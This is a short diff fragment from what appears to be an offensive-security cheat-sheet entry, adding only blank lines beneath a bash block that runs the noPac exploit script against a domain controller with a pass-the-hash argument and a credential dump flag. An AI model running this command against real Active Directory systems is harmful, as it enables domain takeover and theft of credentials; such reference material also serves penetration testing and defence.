@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:11.698743+00:00'
 ```bash
 python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
 ```
+
+
